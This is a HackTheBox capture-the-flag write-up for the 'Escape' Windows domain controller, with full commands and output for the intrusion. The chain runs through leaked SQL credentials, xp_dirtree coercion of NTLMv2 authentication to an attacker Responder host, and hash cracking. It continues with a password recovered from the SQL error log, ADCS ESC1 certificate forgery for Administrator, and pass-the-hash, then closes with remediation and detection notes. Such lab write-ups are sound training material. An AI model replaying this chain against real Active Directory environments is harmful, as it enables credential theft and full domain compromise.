---
layout: default
title: "HackTheBox - Escape"
---

# HackTheBox - Escape

**OS:** Windows Server 2019 (Active Directory)

Escape is a Windows Active Directory machine on `sequel.htb`. The domain controller exposes an SMB share readable by the Guest account containing a PDF that leaks SQL Server credentials. Connecting to MSSQL with those credentials and calling `xp_dirtree` with a UNC path forces the SQL Server service account to authenticate outbound, where Responder captures its NTLMv2 hash. Cracking the hash gives a WinRM foothold as `sql_svc`. BloodHound shows no exploitable path from there, so manual enumeration of the SQL Server error log recovers a second user's password typed accidentally into the login username field. That credential gives lateral movement to `Ryan.Cooper` and the user flag. The privilege escalation runs through a misconfigured ADCS certificate template (ESC1) that allows any domain user to request a certificate with an arbitrary Subject Alternative Name, impersonating the domain Administrator and converting the certificate to an NTLM hash for pass-the-hash.

| Field | Value |
|---|---|
| Platform | HTB |
| Target | `<target-ip> / domain controller` |
| Initial Access | Credential disclosure in internal documentation |
| Privilege Escalation | AD CS certificate-template abuse to Administrator |
| Final Access | Domain Administrator / full domain compromise |

---

## Attack Path

1. Recon identified the exposed services and separated useful attack surface from noise.
2. The first break was Credential disclosure in internal documentation.
3. Post-exploitation enumeration exposed AD CS certificate-template abuse to Administrator.
4. The final privileged context was reached and the required proof was captured.

---

## Recon

Initial nmap identified a standard Windows domain controller profile. The domain was `sequel.htb` and the machine hostname was `DC`. Ports 1433 (MSSQL) and 5985 (WinRM) were notable additions beyond the typical AD set.

| Port | Service | Notes |
|---|---|---|
| 53 | DNS | sequel.htb |
| 88 | Kerberos | |
| 135 / 139 | MSRPC / NetBIOS | |
| 389 / 3268 | LDAP / Global Catalog | |
| 445 | SMB | Guest auth enabled |
| 1433 | MSSQL | Key attack surface |
| 5985 | WinRM | Used for shell |

### SMB Enumeration

Testing Guest authentication first:

```
┌──(v0idravl㉿kali)-[~/HTB/escape]
└─$ nxc smb <target-ip> -u Guest -p ''
SMB                      <target-ip>    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB                      <target-ip>    445    DC               [+] sequel.htb\Guest:
```

Guest authenticated. Listing accessible shares:

```
┌──(v0idravl㉿kali)-[~/HTB/escape]
└─$ nxc smb <target-ip> -u Guest -p '' --shares
SMB                      <target-ip>    445    DC               IPC$            READ            Remote IPC
SMB                      <target-ip>    445    DC               Public          READ
```

The `Public` share was readable. Downloading all contents with the `spider_plus` module:

```
┌──(v0idravl㉿kali)-[~/HTB/escape]
└─$ nxc smb <target-ip> -u Guest -p '' -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=/home/v0idravl/HTB/escape/loot/smb MAX_FILE_SIZE=5000000
```

smbclient confirmed the share contents:

```
┌──(v0idravl㉿kali)-[~/HTB/escape]
└─$ smbclient \\\\<target-ip>\\Public -U 'Guest%' -c 'recurse ON; ls'

  .                                   D        0  Sat Nov 19 03:51:25 2022
  ..                                  D        0  Sat Nov 19 03:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 05:39:43 2022

                5184255 blocks of size 4096. 1466850 blocks available
```

One file: `SQL Server Procedures.pdf`.

---

## Initial Access

### Credential Disclosure in PDF

The PDF was an onboarding document for new employees. A section near the bottom contained hardcoded SQL credentials:

> For new hired and those that are still waiting their users to be created and perms assigned, can sneak a peek at the Database with user PublicUser and password GuestUserCantWrite1. Refer to the previous guidelines and make sure to switch the "Windows Authentication" to "SQL Server Authentication".

The document also linked to `brandon.brown@sequel.htb`, establishing the domain email pattern.

Sensitive credentials embedded in documentation accessible to unauthenticated users is a common finding in environments where IT teams trade convenience for security during onboarding. Any user with Guest access to the share can read this file without any authentication to the domain.

Validating the SQL credentials with nxc:

```
┌──(v0idravl㉿kali)-[~/HTB/escape]
└─$ nxc mssql <target-ip> -u PublicUser -p GuestUserCantWrite1 --local-auth
MSSQL       <target-ip>    1433   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb) (EncryptionReq:False)
MSSQL       <target-ip>    1433   DC               [+] DC\PublicUser:GuestUserCantWrite1
```

### MSSQL xp_dirtree: NTLMv2 Capture

`PublicUser` had no useful query access. The built-in procedure `xp_dirtree` requests a directory listing over UNC, which forces the SQL Server service account to make an outbound SMB connection and authenticate. Pointing it at an attacker-controlled host captures the NTLMv2 hash for the SQL Server service account before the connection even completes.

Starting Responder on the VPN interface to capture the authentication:

```
┌──(v0idravl㉿kali)-[~/HTB/escape]
└─$ sudo responder -I tun0 -v
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[*] Tips jar:
    USDT -> 0xCc98c1D3b8cd9b717b5257827102940e4E17A19A
    BTC  -> bc1q9360jedhhmps5vpl3u05vyg4jryrl52dmazz49

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]
    DHCPv6                     [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [<target-ip>]
    Responder IPv6             [fe80::43d6:a9f7:21cb:694]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-QD1S5XAM7BR]
    Responder Domain Name      [59OI.LOCAL]
    Responder DCE-RPC Port     [45957]

[*] Version: Responder 3.2.2.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>

[+] Listening for events...
```

Connecting with `mssqlclient.py` and calling `xp_dirtree` with the listener's IP:

```
┌──(v0idravl㉿kali)-[~/HTB/escape]
└─$ python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py PublicUser:GuestUserCantWrite1@<target-ip>
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (PublicUser  guest@master)> exec master..xp_dirtree '\\<target-ip>\test\test.txt'
subdirectory   depth
```

Responder caught the incoming authentication:

```
[SMB] NTLMv2-SSP Client   : <target-ip>
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:76f60725db52a8d0:<redacted-32-hex>:<redacted-long-hash>
```

The hash belongs to `sequel\sql_svc`, the Windows service account running SQL Server. Cracking with hashcat mode 5600:

```
┌──(v0idravl㉿kali)-[~/HTB/escape]
└─$ hashcat -m 5600 loot/hash.txt /usr/share/wordlists/rockyou.txt

SQL_SVC::sequel:76f60725db52a8d0:<redacted-32-hex>:010100000000000000607acf88e9dc01b0a15bee4897abc90000000002000800350039004f00490001001e00570049004e002d0051004400310053003500580041004d0037004200520004003400570049004e002d0051004400310053003500580041004d003700420052002e00350039004f0049002e004c004f00430041004c0003001400350039004f0049002e004c004f00430041004c0005001400350039004f0049002e004c004f00430041004c000700080000607acf88e9dc01060004000200000008003000300000000000000000000000003000001f8121b73d83a21b66ca639bf1ce40a3955d2470e5d102a22accf32335e31d6b0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00320031000000000000000000:REGGIE1234ronnie
```

Credentials: `sql_svc:REGGIE1234ronnie`

### WinRM Foothold

```
┌──(v0idravl㉿kali)-[~/HTB/escape]
└─$ evil-winrm -i <target-ip> -u SQL_SVC -p REGGIE1234ronnie
```

---

## Post-Exploitation Enumeration

### User Discovery

Listing `C:\Users` showed a second user home directory alongside `sql_svc`:

```
    Directory: C:\Users

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/7/2023   8:58 AM                Administrator
d-r---        7/20/2021  12:23 PM                Public
d-----         2/1/2023   6:37 PM                Ryan.Cooper
d-----         2/7/2023   8:10 AM                sql_svc
```

Enumerating domain users confirmed additional accounts:

```
┌──(v0idravl㉿kali)-[~/HTB/escape]
└─$ nxc smb <target-ip> -u SQL_SVC -p 'REGGIE1234ronnie' --users
SMB         <target-ip>    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         <target-ip>    445    DC               [+] sequel.htb\SQL_SVC:REGGIE1234ronnie
SMB         <target-ip>    445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         <target-ip>    445    DC               Administrator                 2022-11-18 21:13:16 0       Built-in account for administering the computer/domain
SMB         <target-ip>    445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         <target-ip>    445    DC               krbtgt                        2022-11-18 17:12:10 0       Key Distribution Center Service Account
SMB         <target-ip>    445    DC               Tom.Henn                      2022-11-18 21:13:12 0
SMB         <target-ip>    445    DC               Brandon.Brown                 2022-11-18 21:13:13 0
SMB         <target-ip>    445    DC               Ryan.Cooper                   2023-02-01 21:52:57 0
SMB         <target-ip>    445    DC               sql_svc                       2022-11-18 21:13:13 0
SMB         <target-ip>    445    DC               James.Roberts                 2022-11-18 21:13:13 0
SMB         <target-ip>    445    DC               Nicole.Thompson               2022-11-18 21:13:13 0
SMB         <target-ip>    445    DC               [*] Enumerated 9 local users: sequel
```

### BloodHound Collection

SharpHound uploaded and collected all AD relationships:

```powershell
*Evil-WinRM* PS C:\Users\sql_svc\Documents> upload /usr/share/sharphound/SharpHound.exe

Info: Uploading /usr/share/sharphound/SharpHound.exe to C:\Users\sql_svc\Documents\SharpHound.exe
Data: 1802240 bytes of 1802240 bytes copied
Info: Upload successful!

*Evil-WinRM* PS C:\Users\sql_svc\Documents> .\SharpHound.exe -c All --zipfilename bh.

*Evil-WinRM* PS C:\Users\sql_svc\Documents> download 20260522094353_bh.zip
```

The BloodHound graph showed no exploitable path from `sql_svc` to Domain Admins. No dangerous group memberships, no ACL edges, nothing interesting with `sql_svc`'s current position. The path forward required manual file enumeration rather than graph-based AD abuse.

### SQL Server Error Log: Credential Exposure

The SQL Server instance stored logs at a custom path: `C:\SQLServer\Logs\`. The backup log file `ERRORLOG.BAK` contained authentication events from service startup:

```powershell
*Evil-WinRM* PS C:\Users\sql_svc\Documents> type C:\SQLServer\Logs\ERRORLOG.BAK
```

```
2022-11-18 13:43:05.97 Server      Command Line Startup Parameters:
         -s "SQLMOCK"
         -m "SqlSetup"
         -Q
         -q "SQL_Latin1_General_CP1_CI_AS"
         -T 4022
         -T 4010
         -T 3659
         -T 3610

2022-11-18 13:43:07.44 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.72 spid51      Attempting
```

Two consecutive failed logins: first under `sequel.htb\Ryan.Cooper` with an incorrect password, then immediately with `NuclearMosquito3` as the username. The second entry is a classic fat-finger: the user typed their password into the username field. SQL Server logs the username field verbatim for every failed authentication, so the password ends up sitting in the error log in plaintext.

This is not a vulnerability in SQL Server itself. It is a logging design decision that has significant consequences when users make this mistake, and it is a documented technique in real-world incident response. Attackers with even read-only access to the SQL Server service or log directory can recover it.

Credentials: `Ryan.Cooper:NuclearMosquito3`

---

## Lateral Movement

### Shell as Ryan.Cooper

```
┌──(v0idravl㉿kali)-[~/HTB/escape]
└─$ evil-winrm -i <target-ip> -u Ryan.Cooper -p NuclearMosquito3
```

Works. User proof:

```
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> whoami; hostname; type C:\Users\Ryan.Cooper\Desktop\user.txt
sequel\ryan.cooper
dc
<redacted-32-hex>
```

---

## Privilege Escalation

### ADCS ESC1: Misconfigured Certificate Template

Active Directory Certificate Services was running on the domain controller. Certipy found a vulnerable template with `Ryan.Cooper`'s credentials:

```
┌──(v0idravl㉿kali)-[~/HTB/escape]
└─$ certipy-ad find -u Ryan.Cooper@sequel.htb -p NuclearMosquito3 -dc-ip <target-ip> -stdout -vulnerable
```

The template `UserAuthentication` was flagged as ESC1:

```
Certificate Authorities
  0
    CA Name                             : sequel-DC-CA
    DNS Name                            : dc.sequel.htb
    Certificate Subject                 : CN=dc.sequel.htb, DC=sequel, DC=htb

Certificate Templates
  0
    Template Name                       : UserAuthentication
    Enabled                             : True
    Client Authentication               : True
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Rights                   : SEQUEL.HTB\Domain Users
    [!] Vulnerabilities
      ESC1                              : 'SEQUEL.HTB\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
```

ESC1 occurs when a certificate template:
1. Allows the enrollee to specify a Subject Alternative Name (SAN)
2. Has the Client Authentication EKU
3. Grants enrollment rights to a low-privilege group

The combination means any domain user can request a certificate claiming to be any other principal, including the domain Administrator. The CA has no way to verify the SAN against the enrolling account's actual identity. Kerberos accepts the resulting certificate as proof of identity for the SAN principal via PKINIT (Public Key Cryptography for Initial Authentication).

The certipy request must target the CA by its DNS hostname, not by IP. Adding the DC hostname to `/etc/hosts` first:

```
┌──(v0idravl㉿kali)-[~/HTB/escape]
└─$ echo "<target-ip>  dc.sequel.htb sequel.htb" >> /etc/hosts
```

Requesting a certificate for `administrator@sequel.htb`:

```
┌──(v0idravl㉿kali)-[~/HTB/escape]
└─$ certipy-ad req -u Ryan.Cooper@sequel.htb -p NuclearMosquito3 -dc-ip <target-ip> \
    -target dc.sequel.htb \
    -ca sequel-DC-CA \
    -template UserAuthentication \
    -upn administrator@sequel.htb

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

Authenticating with the certificate via PKINIT to recover the Administrator NTLM hash:

```
┌──(v0idravl㉿kali)-[~/HTB/escape]
└─$ certipy-ad auth -pfx administrator.pfx -dc-ip <target-ip>

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': <redacted-32-hex>:<redacted-nt-hash>
```

Passing the hash with evil-winrm:

```
┌──(v0idravl㉿kali)-[~/HTB/escape]
└─$ evil-winrm -i <target-ip> -u Administrator -H <redacted-nt-hash>
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami; hostname; type C:\Users\Administrator\Desktop\root.txt
sequel\administrator
dc
[root flag]
```

---

## Remediation

- Remove or harden the specific exposure used for initial access: Credential disclosure in internal documentation.
- Fix the privilege boundary that enabled escalation: AD CS certificate-template abuse to Administrator.
- Audit AD privileges with BloodHound/PowerView and remove nonessential tier-0 rights.
- Rotate credentials observed or replayed during the chain and search for reuse on adjacent systems.
- Validate the fix by safely replaying the enumeration steps that originally exposed the weakness.

## Summary

**Key takeaway:** Escape chains four issues that each appear low-severity in isolation: Guest-readable SMB shares, credentials in documents, MSSQL service account coercion via xp_dirtree, and an ADCS template that trusts the enrollee's claimed identity. The SQL Server error log is an underappreciated credential source in real-world assessments. ADCS ESC1 remains one of the most reliable domain compromise paths in AD environments running certificate services, and the majority of real-world deployments running pre-2022 configurations remain vulnerable.

---

## Root Cause

The demonstrated path worked because dangerous AD CS template configuration, hardcoded credentials in distributed code, unauthenticated management/service exposure, local privilege boundary misconfiguration gave the attacker a bridge from reconnaissance to execution. The important pattern is the chain: Credential disclosure in internal documentation created a foothold, and AD CS certificate-template abuse to Administrator converted that foothold into Domain Administrator / full domain compromise.

## Impact

Successful exploitation reached Domain Administrator / full domain compromise. That level of access allows command execution, proof or sensitive-file access, credential collection, and a realistic path to additional systems if the same credentials, services, or trust relationships exist elsewhere.

## Detection Opportunities

- Alert on exploit attempts or suspicious access patterns against the service that enabled initial access.
- Correlate successful authentication, new process creation, and privilege-boundary events after enumeration activity.
- Monitor for the specific escalation signal: AD CS certificate-template abuse to Administrator.
- Collect and review Kerberos, LDAP, certificate, and directory-replication events for nonstandard principals.

## Lessons Learned

- The winning path was not just a vulnerable service; it was the connection between Credential disclosure in internal documentation and AD CS certificate-template abuse to Administrator.
- Preserve the observations that explain why each pivot made sense, not only the commands that worked.
- Write remediation from the root cause of each step so the report reads like an operator narrative and a defender action plan.
